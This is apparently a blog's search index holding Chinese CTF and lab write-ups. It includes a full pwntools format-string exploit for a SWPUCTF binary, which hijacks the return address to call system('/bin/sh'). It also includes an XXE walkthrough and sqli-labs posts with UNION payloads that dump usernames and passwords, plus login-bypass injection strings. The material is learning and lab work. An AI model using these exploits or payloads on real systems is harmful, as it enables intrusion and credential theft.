<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>SWPUCTF</title>
    <url>/2019/12/16/SWPUCTF/</url>
    <content><![CDATA[<h1 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h1><p>先check</p>
<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575638684522.png" alt="1575638684522"></p>
<p>还可以、</p>
<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575638774113.png" alt="1575638774113"></p>
<p>这个题涉及了bss段的格式化字符串把漏洞，需要通过改写栈上的地址来挟持返回地址，之后再改写我们想输入的字符串（bin/sh）</p>
<p>难度在于</p>
<p>1.查找libc版本</p>
<p>2.改写链的地址</p>
<p>3.对于改写的话需要一个一个字节的去改写，具体看脚本</p>
<p> <a href="C:\Users\Administrator\Desktop\login.py">login.py</a> </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='pumpkin9@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level='debug',terminal=['tmux','split','-h'],arch='amd64')</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./login'</span></span><br><span class="line">libc_name = <span class="string">'/lib/i386-linux-gnu/libc.so.6'</span></span><br><span class="line">ip = <span class="string">'108.160.139.79'</span></span><br><span class="line">port = <span class="string">'9090'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">lib = ELF(libc_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">p = process(file_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(ip,int(port))</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> name,x : log.info(name+<span class="string">':0x%x'</span>%x)</span><br><span class="line">ls = <span class="keyword">lambda</span> name,x : log.success(name+<span class="string">':0x%x'</span>%x)</span><br><span class="line"></span><br><span class="line">key = <span class="string">"wllmmllw"</span></span><br><span class="line">p.sendlineafter(<span class="string">"Please input your name: \n"</span>,<span class="string">"pumpkin9"</span>)</span><br><span class="line">payload = <span class="string">"%15$p"</span></span><br><span class="line">p.sendlineafter(<span class="string">"password: \n"</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">"This is the wrong password: "</span>)</span><br><span class="line">libc = int(p.recvuntil(<span class="string">"\n"</span>,<span class="literal">True</span>),<span class="number">16</span>)<span class="number">-241</span>-lib.symbols[<span class="string">'__libc_start_main'</span>]<span class="comment">#获取libc基地址</span></span><br><span class="line">ls(<span class="string">"libc addr"</span>,libc)</span><br><span class="line">onegg = libc + lib.symbols[<span class="string">'system'</span>]<span class="comment">#获取system地址</span></span><br><span class="line">ls(<span class="string">"one_gadget"</span>,onegg)</span><br><span class="line">binsh = libc + lib.search(<span class="string">'/bin/sh'</span>).next()<span class="comment">#获取bin/sh地址</span></span><br><span class="line">ls(<span class="string">"sh addr"</span>,binsh)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Try again!\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"%6$p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"This is the wrong password: "</span>)</span><br><span class="line">stack = int(p.recvuntil(<span class="string">"\n"</span>,<span class="literal">True</span>),<span class="number">16</span>)<span class="comment">#获取的是ebp中的内容</span></span><br><span class="line">target = stack <span class="number">-12</span> <span class="comment">#这个的计算结果为返回地址</span></span><br><span class="line">ls(<span class="string">"stack addr"</span>,stack)</span><br><span class="line">ls(<span class="string">"target addr"</span>,target)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">num = target&amp;<span class="number">0xff</span><span class="comment">#进行按位与运算目的是除去多余的位数，在这里是保留后12位</span></span><br><span class="line"></span><br><span class="line">data1 = <span class="number">0x100</span><span class="comment">#onegg&amp;0xff</span></span><br><span class="line">data2 = (onegg&amp;<span class="number">0xffff</span>)&gt;&gt;<span class="number">8</span> <span class="comment">#右移位运算获取第二个字符位</span></span><br><span class="line">data3 = (onegg&amp;<span class="number">0xffffff</span>)&gt;&gt;<span class="number">16</span><span class="comment">#获取第三个字符位</span></span><br><span class="line">data4 = onegg&gt;&gt;<span class="number">24</span><span class="comment">#获取第四个字符位</span></span><br><span class="line">li(<span class="string">"sys1"</span>,data1)</span><br><span class="line">li(<span class="string">"sys2"</span>,data2)</span><br><span class="line">li(<span class="string">"sys3"</span>,data3)</span><br><span class="line">li(<span class="string">"sys3"</span>,data4)</span><br><span class="line">data5 = binsh&amp;<span class="number">0xff</span><span class="comment">#同data1-4的作用</span></span><br><span class="line">data6 = ((binsh&amp;<span class="number">0xffff</span>)&gt;&gt;<span class="number">8</span>)</span><br><span class="line">data7 = ((binsh&amp;<span class="number">0xffffff</span>)&gt;&gt;<span class="number">16</span>)</span><br><span class="line">data8 = binsh&gt;&gt;<span class="number">24</span></span><br><span class="line">li(<span class="string">"sh1"</span>,data5)</span><br><span class="line">li(<span class="string">"sh2"</span>,data6)</span><br><span class="line">li(<span class="string">"sh3"</span>,data7)</span><br><span class="line">li(<span class="string">"sh4"</span>,data8)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num)+<span class="string">"c%6$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data1)+<span class="string">"c%10$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num+<span class="number">1</span>)+<span class="string">"c%6$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data2)+<span class="string">"c%10$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num+<span class="number">2</span>)+<span class="string">"c%6$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data3)+<span class="string">"c%10$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num+<span class="number">3</span>)+<span class="string">"c%6$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data4)+<span class="string">"c%10$hhn"</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num+<span class="number">8</span>)+<span class="string">"c%6$hhn"</span>)<span class="comment">#参数放到返回地址后面即可</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data5)+<span class="string">"c%10$hhn"</span>)<span class="comment">#但是为什么要间隔四个字节呢</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num+<span class="number">9</span>)+<span class="string">"c%6$hhn"</span>)<span class="comment">#对于32位的程序根据libc中的system一般都要这样</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data6)+<span class="string">"c%10$hhn"</span>)<span class="comment">#先记住</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num+<span class="number">10</span>)+<span class="string">"c%6$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data7)+<span class="string">"c%10$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num+<span class="number">11</span>)+<span class="string">"c%6$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data8)+<span class="string">"c%10$hhn"</span>)</span><br><span class="line"><span class="comment">#raw_input('#')</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,key)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>web狗之xml实体攻击</title>
    <url>/2019/12/16/web%E7%8B%97%E4%B9%8Bxml%E5%AE%9E%E4%BD%93%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h2 id="web狗之xml实体攻击浅学"><a href="#web狗之xml实体攻击浅学" class="headerlink" title="web狗之xml实体攻击浅学"></a>web狗之xml实体攻击浅学</h2><p>我们先来了解一下xml</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;chybeta&lt;&#x2F;to&gt;</span><br><span class="line">&lt;from&gt;ph0en1x&lt;&#x2F;from&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br><span class="line">在上面代码中的第一行，定义XML的版本与编码。</span><br><span class="line"></span><br><span class="line">在XML文档中，所有的元素都必须正确的嵌套，形成树形结构。并且整个XML文档中必须要有一个根元素。如上代码，&lt;note&gt;是整个文档的根元素。嵌套在note标签中的&lt;to&gt;和&lt;from&gt;则是根的子元素。</span><br><span class="line"></span><br><span class="line">同时，所有的XML元素都必须有关闭标签，这点不像html语法那样松散。如果缺失关闭标签，则会导致XML解析失败。</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>我们再了解一下实体：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">所有的XML文档都由五种简单的构建模块（元素，属性，实体，PCDATA CDATA）构成。这里着重介绍一下实体：实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。因此我们利用引入实体，构造恶意内容，从而达到攻击的目的。</span><br><span class="line">实体类型：</span><br><span class="line">XML实体分为四种：字符实体，命名实体，外部实体，参数实体。</span><br></pre></td></tr></table></figure>
<p>文档类型定义：DTD</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">简单的说，DTD的作用是定义XML文档的合法构建模块。如前所述，实体也是构建模块之一。因此可以利用DTD来内部或外部引入实体。</span><br><span class="line"></span><br><span class="line">其基本格式：</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE 根元素名 [ 元素描述 ]&gt;</span><br></pre></td></tr></table></figure>
<p>内部引入<br>格式：</p>
<!ENTITY 实体名称 "实体的值">

<p>将DTD和XML放在同一份文档中，利用DTD定义的实体即为内部实体。<br>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ENTITY chybeta &quot;Hello World!&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;xxe&gt;</span><br><span class="line">&amp;chybeta;</span><br><span class="line">&lt;&#x2F;xxe&gt;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">访问该XML文档，&amp;chybeta;会被解析为Hello World!并输出。</span><br></pre></td></tr></table></figure>


<p>外部引入<br>基本格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">通过引用定义在外部的DTD中的实体，我们称之为外部实体。</span><br></pre></td></tr></table></figure>
<p>之后呢，我们通过jarvis上的一道web题来尝试一下：<br><a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">http://web.jarvisoj.com:9882/</a><br>我们先进行一下抓包<br><img src="https://img-blog.csdnimg.cn/20190405211355937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>之后呢我们发现第一个红箭头的位置，使用的是json方式传入<br>我们改为xml，之后编写代码进行传入<br><img src="https://img-blog.csdnimg.cn/20190405211630967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>go后我们得到flag<br><img src="https://img-blog.csdnimg.cn/20190405211650164.png" alt="在这里插入图片描述"><br>小白，还请多多关照</p>
]]></content>
  </entry>
  <entry>
    <title>urldecode二次编码绕过</title>
    <url>/2019/12/16/urldecode%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h2 id="代码审计日志三urldecode二次绕过"><a href="#代码审计日志三urldecode二次绕过" class="headerlink" title="代码审计日志三urldecode二次绕过"></a>代码审计日志三urldecode二次绕过</h2><p>题目：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">echo(&quot;</span><br><span class="line"></span><br><span class="line">not allowed!</span><br><span class="line">&quot;);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">$_GET[id] &#x3D; urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] &#x3D;&#x3D; &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;</span><br><span class="line"></span><br><span class="line">Access granted!</span><br><span class="line">&quot;;</span><br><span class="line">echo &quot;</span><br><span class="line"></span><br><span class="line">flag</span><br><span class="line">&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>经过审计：<br>由</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_GET[id] &#x3D; urldecode($_GET[id]);</span><br></pre></td></tr></table></figure>
<p>可知，我们需要将hackerDJ进行urldecode编码后get上传<br>我们上传后得到：<br>not allowed!<br>再看url<br>发现我们get传入的url编码值被浏览器自动解码<br>因此我们需要再一次进行编码<br>上传后得到flag</p>
]]></content>
  </entry>
  <entry>
    <title>sql语句之where字句学习笔记</title>
    <url>/2019/12/16/sql%E8%AF%AD%E5%8F%A5%E4%B9%8Bwhere%E5%AD%97%E5%8F%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="sql语句之where字句学习笔记"><a href="#sql语句之where字句学习笔记" class="headerlink" title="sql语句之where字句学习笔记"></a>sql语句之where字句学习笔记</h2><p>我们先说一下wherer字句作用：</p>
<pre><code>限制表中的数据返回  符合where后面的条件的数据就会被选中，不符合where条件的语句会被过滤掉</code></pre><p>1.两个极限条件</p>
<pre><code>where 1 = 1
where 1 = 2</code></pre><p>自我感觉一般用来完善sql语法补齐引号<br>2.字符串条件的表达<br>就像我们爆表的那个常用语句</p>
<a id="more"></a>

<pre><code>?id=0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()</code></pre><p>先说明一下<br>table_schema 的意思是数据库名<br>database()是返回当前的数据库名<br>因此此处的where意思是指：<br>查询的范围被限定在了此数据库中，即起到约束作用<br>3.模糊查询<br>格式为：<br>like（像）+ 通配符</p>
<pre><code>（1）    “%”为通配符，代表0 - n个任意字符
（1）“-”代表一个任意字符</code></pre><p>例如：</p>
<pre><code>SELECT * FROM news WHERE keyword like &apos;%$keyword%&apos;</code></pre><p>意思就是此查询news中所有的含有我们所输入的$keyword的字符串（暂且先这样说）</p>
<pre><code>where  name like  ‘_$keyword%’</code></pre><p>这个就是查询中间为我们所输入的字符串<br>@<br>当我们要查询例如’$keyword_’时，我们要进行转义<br>即使用\</p>
<pre><code>where name like &apos;$keyword\_%&apos;</code></pre><p>4.还有使用一些条件链接符号<br>进行限制条件</p>
]]></content>
  </entry>
  <entry>
    <title>sqli-lab 学习记录less2</title>
    <url>/2019/12/16/sqli-lab%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95less2/</url>
    <content><![CDATA[<hr>
<p>title:sqli-lab 学习记录less2<br>date:2019-3-16<br>tags:sqli-lab</p>
<hr>
<h2 id="sqli-lab-学习记录less2"><a href="#sqli-lab-学习记录less2" class="headerlink" title="sqli-lab 学习记录less2"></a>sqli-lab 学习记录less2</h2><p>less2<br>1.我们先来判断这次的sql注入类型<br>我们输入</p>
<pre><code>?id=1
?id=1&apos;</code></pre><p>发现第一个语句返回正确<br>但是第二个却有了报错<br>我们因此可以判断<br>这次的sql注入类型为数字类型</p>
<a id="more"></a>
<p>2.<br>之后和less1一样<br>我们进行暴表的名字（暴表）<br>我们输入</p>
<pre><code>?id=0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()</code></pre><p>我们由此得到<br><img src="https://img-blog.csdnimg.cn/20190316101700495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3.我们之后开始爆列喽<br>输入</p>
<pre><code>?id=0 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos;</code></pre><p>我们可以得到<br><img src="https://img-blog.csdnimg.cn/20190316102305663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">4.最后我们来获得我们要得到的东西<br>输入代码</p>
<pre><code>?id=0 union select 1,group_concat(id,username,password),3 from users</code></pre><p>就得到了我们要得到的东西<br><img src="https://img-blog.csdnimg.cn/20190316104403774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">另外<br>我们附加关于where的知识</p>
<p>table_schema是数据库名<br>database()函数会返回当前的数据库名<br><img src="https://img-blog.csdnimg.cn/20190316104540872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20190316104550458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>where就是约束条件<br>这个 where后面  就是为了约束一下 我要查询的数据库  而不是去  看其他数据库里的东西<br>我要看的 东西 就是 当前数据库database里的  不是其他的数据里的<br>比如 有两个数据库  数据库1  数据库2   当前的数据库database是数据库1   你可以 where table_schema=database() 或者是where table_schema=’数据库1’</p>
]]></content>
  </entry>
  <entry>
    <title>sql注注入类型解释</title>
    <url>/2019/12/16/sql%E6%B3%A8%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%A7%A3%E9%87%8A/</url>
    <content><![CDATA[<hr>
<p>title: sql注注入类型解释<br>date: 2019-03-16 09:53:41<br>tags:</p>
<hr>
<p>sql注入类型简单记录<br>1.sql注入流程<br>（1）判断注入点<br>（2）判断注入类型<br>（3）判断数据库类型<br>（3）获得数据库数据，提权</p>
<a id="more"></a>
<p>一、判断注入点</p>
<p>所有的输入只要和数据库进行交互的，都有可能触发SQL注入<br>一般有三类<br>Get参数触发SQL注入<br>POST参数触发SQL注入<br>Cookie触发SQL注入</p>
<pre><code>一般我们输入&apos;来判断 是否存在注入点
如果页面返回错误，则存在 Sql 注入
原因是：
原因是无论字符型还是整型都会因为单引号个数不匹配而报错。</code></pre><p>二、判断注入类型<br>我们来了解一下：<br>有以下几种注入类型：<br>（1）数字型注入点<br>（2）字符型注入点<br>（3）搜索型注入点<br>（4）内嵌式sql注入<br>（5）终止试sql注入<br>之后我们进行解释：<br>1.数字型注入点<br>测试方法：</p>
<pre><code>
http://host/test.php?id=100 and 1=1 返回成功

http://host/test.php?id=100 and 1=2 返回失败</code></pre><p>为什么呢</p>
<p>假设我们网站的SQL查询的语句是这样的SELECT * FROM news WHERE id=$id<br>那么这个$id 即为用户提交的</p>
<p>当我们输入的是100 and 1=1<br>语句就变成了这样SELECT * FROM news WHERE id=100 and 1=1<br>对于and</p>
<pre><code>这个SQL语句and左边是返回成功的，因为我们是在有这个id的情况下后面加上我们的注入语句，如果这个id不存在，那就没法测试了

而在and右边，1=1也是恒成立的，所以整个语句返回的是成功

当然，如果后面改成了1=2的话，因为1=2是不成立的，and语句的判断逻辑是只要有一个不成立，就返回失败，所以1=2最后会返回的是失败
</code></pre><p>因此我们可以这样进行判断<br>2.字符型注入点<br>测试方法：</p>
<p><a href="http://host/test.php?name=man&#39;" target="_blank" rel="noopener">http://host/test.php?name=man&#39;</a> and ‘1’=’1 返回成功</p>
<p><a href="http://host/test.php?name=man&#39;" target="_blank" rel="noopener">http://host/test.php?name=man&#39;</a> and ‘1’=’2返回失败</p>
<p>这里就使上面的数字型变为了字符型</p>
<p>原因如下：</p>
<pre><code>还是假设我们网站的SQL语句是这样的
SELECT * FROM news WHERE name=&apos;$name&apos;
当我们构造输入为下面这个的时候
man&apos; and &apos;1&apos;=&apos;1
语句就变成了
SELECT * FROM news WHERE name=&apos;man&apos; and &apos;1&apos;=&apos;1&apos;</code></pre><p>发现什么了没？这个SQL已经闭合了</p>
<pre><code>还是一样的，这里and的左边是一定成立的，而and右边也是一样的成立，所以and逻辑之后，整个语句返回成功
同理可知如果后面是1&apos;=&apos;2就会返回失败，当然，这里不一定非要是1或者2，因为是字符型，所以我们可以输入任何字符</code></pre><p>比如这样</p>
<pre><code>http://host/test.php?name=man&apos; and &apos;a&apos;=&apos;a 返回成功
http://host/test.php?name=man&apos; and &apos;a&apos;=&apos;b返回失败 </code></pre><p>3.搜索式sql注入</p>
<p>测试方法</p>
<p><a href="http://host//test.php?keyword=python%&#39;" target="_blank" rel="noopener">http://host//test.php?keyword=python%&#39;</a> and 1=1 and ‘%’=’</p>
<p><a href="http://host//test.php?keyword=python%&#39;" target="_blank" rel="noopener">http://host//test.php?keyword=python%&#39;</a> and 1=2 and ‘%’=’</p>
<p>假设我们的SQL查询语句是这样的</p>
<pre><code>SELECT * FROM news WHERE keyword like &apos;%$keyword%&apos;

这里的$keyword是用户的输入

当我们输入以下语句的时候
pt%&apos; and 1=1 and &apos;%&apos;=&apos;
最终我们得到的语句是这样的
SELECT * FROM news WHERE keyword like &apos;%pt%&apos; and 1=1 and &apos;%&apos;=&apos;%&apos;
这个语句又一次的闭合了</code></pre><p>这里我们再分析以下，因为是and逻辑，只要有一个错误，就返回错误</p>
<p>我们可以把这个语句分为三段</p>
<pre><code>SELECT * FROM news WHERE keyword like &apos;%python%&apos;

and 1=1

and &apos;%&apos;=&apos;%&apos;

第一行的语句肯定是成功（再强调一遍，我们要在存在的查询上构造SQL注入）

第二句也是，第三句也是，因为自己肯定等于自己啊

但是如果我们把第二句换成1=2，那么这个语句肯定就会返回失败了，就是这个原理</code></pre><p>4.内嵌式sql注入<br>内联注入是指查询注入SQL代码后，原来的查询仍然全部执行</p>
<p>假设我们的网站SQL查询语句是这样的</p>
<p>SELECT * FROM admin WHER username=’$name’ AND password =’$passwd’</p>
<p>这一看就是个登录页面的代码</p>
<pre><code>假如我们构造如下语句提交到登录框中的username

&apos; or &apos;&apos;=&apos;

或者提交到password框里面，这两种提交方法是不一样的，我们下面就来分析一下这两个提交方法

提交到username我们的语句就会成为这样

SELECT * FROM admin WHER username=&apos;&apos; or &apos;&apos;=&apos;&apos; AND password =&apos;fuzz&apos;</code></pre><p>fuzz是我们随便输入的字符串</p>
<pre><code>而提交到password则会是这样的

SELECT * FROM admin WHER username=&apos;fuzz&apos; AND password =&apos;&apos; or &apos;&apos;=&apos;&apos;</code></pre><p>注:<br>    在SQL语句中，AND的优先级是大于OR的<br>    先计算AND，然后计算OR，所以这里我们的语句会被OR分为两段SQL语句</p>
<p>这是username框的</p>
<pre><code>SELECT * FROM admin WHER username=&apos;&apos;

or

&apos;&apos;=&apos;&apos; AND password =&apos;fuzz&apos;</code></pre><p>或者password框的是这样</p>
<pre><code>SELECT * FROM admin WHER username=&apos;fuzz&apos; AND password =&apos;&apos;

or

&apos;&apos;=&apos;&apos;</code></pre><p>我们首先用第一个来分析</p>
<p>首先计算AND之后</p>
<pre><code>SELECT * FROM admin WHER username=&apos;&apos;返回失败

or

&apos;&apos;=&apos;&apos; AND password =&apos;fuzz&apos;返回失败</code></pre><p>数据库是不会存在username为NULL的字段的，所以第一句返回的是失败，第三句中，因为password是我们随便输入的，99.99%是不会存在这个密码的，于是AND之后，我们的第三句也是失败的，所以整个语句返回失败的</p>
<p>但是我们的password情况就不一样了</p>
<pre><code>SELECT * FROM admin WHER username=&apos;fuzz&apos; AND password =&apos;&apos;

or

&apos;&apos;=&apos;&apos;</code></pre><p>这里我们第一句是返回失败的，但是我们的第二句’’=’’是返回成功的，OR逻辑是有一个是成功就返回成功，于是我们的整个语句就会返回成功</p>
<p>返回成功之后我们就会绕过登录表单直接登录系统了<br>5.终止式sql注入<br>终止式SQL语句注入是指攻击者在注入SQL代码时，通过注释剩下的查询来成功结束该语句</p>
<p>于是被注释的查询不会被执行，我们还是拿上面那个例子举例</p>
<pre><code>我们上面已经知道，在username框内填入

&apos; or &apos;&apos;=&apos;

程序是不会返回成功的，我们就没有办法在username做文章了吗？</code></pre><p>错了，我们还有终止式</p>
<p>还是上面那个SQL查询语句</p>
<p>SELECT * FROM admin WHER username=’$name’ AND password =’$passwd’</p>
<p>这里我们构造如下username输入</p>
<pre><code>&apos; or &apos;&apos;=&apos;&apos; --</code></pre><p>之后我们就可以得到如下的查询语句</p>
<pre><code>SELECT * FROM admin WHER username=&apos;&apos; or &apos;&apos;=&apos;&apos; --&apos; AND password =&apos;fuzz&apos;</code></pre><p>这里的fuzz是我们随便输入的，–是注释符</p>
<p>这样，我们的语句就可以分为三个部分了</p>
<pre><code>SELECT * FROM admin WHER username=&apos;&apos;

or &apos;&apos;=&apos;&apos; 返回成功

--&apos; AND password =&apos;fuzz&apos;</code></pre><p>第一句肯定是返回失败的，但是我们第二句会返回成功</p>
<p>后面已经被我们注释掉了，是不会执行的，所以我们还是可以通过在username做这个手脚来绕过登录</p>
<p>下面是我们常见的一些终止方式<br>终止字符串：</p>
<p>– ， #， %23， %00， /*<br>终止方法：</p>
<p>– , ‘– , ‘)– , ) – , ‘)) –, ))–</p>
<hr>
]]></content>
  </entry>
  <entry>
    <title>sqli-lab 学习记录 less3-less4</title>
    <url>/2019/12/16/sqli-lab%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%20less3-less4/</url>
    <content><![CDATA[<h2 id="sqli-lab-学习记录-less3-less4"><a href="#sqli-lab-学习记录-less3-less4" class="headerlink" title="sqli-lab 学习记录  less3-less4"></a>sqli-lab 学习记录  less3-less4</h2><p>less3:<br>进入界面<br>我们先进行判断注入的类型<br>我们输入</p>
<pre><code>?id=1</code></pre><p>有正常回显<br>之后我们在输入</p>
<pre><code>?id=1&apos;</code></pre><a id="more"></a>
<p>发现出现了：<br><img src="https://img-blog.csdnimg.cn/20190319192230358.png" alt="在这里插入图片描述">根据后面的报错我们可以大致的判断此sql语句是这样的：</p>
<pre><code>SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;</code></pre><p>之后呢，我们来验证我们的判断<br>我们输入</p>
<pre><code>?id=1&apos;) %23</code></pre><p>得到正常回显<br><img src="https://img-blog.csdnimg.cn/20190319192814704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>因此我们就确定了注入类型<br>之后的步骤就和我们之前做less1与2一样了<br>这里就不过多解释了</p>
<p>less4<br>我们还是一样判断注入类型<br>(这个类型与less3相似，但是爆出错误却很难)<br>我刚开始输入了</p>
<pre><code>?id=1
?id=1&apos;
?id=1 and 1=2</code></pre><p>均有回响<br>弄得我一脸懵逼<br>之后尝试使用</p>
<pre><code>?id=1&quot;</code></pre><p>终于爆出了错误<br><img src="https://img-blog.csdnimg.cn/2019031920140258.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">从错误中我们大致可以判断<br>应该是类似于<br>（“ $id ”）<br>我们可以构造</p>
<pre><code>?id=1&quot;) %23</code></pre><p>得到正常回显<br>之后我们的步骤和之前一样就可以了</p>
<p>萌新文章，还请大佬们指导<br>邮箱：<a href="mailto:497710073@qq.com">497710073@qq.com</a></p>
]]></content>
  </entry>
  <entry>
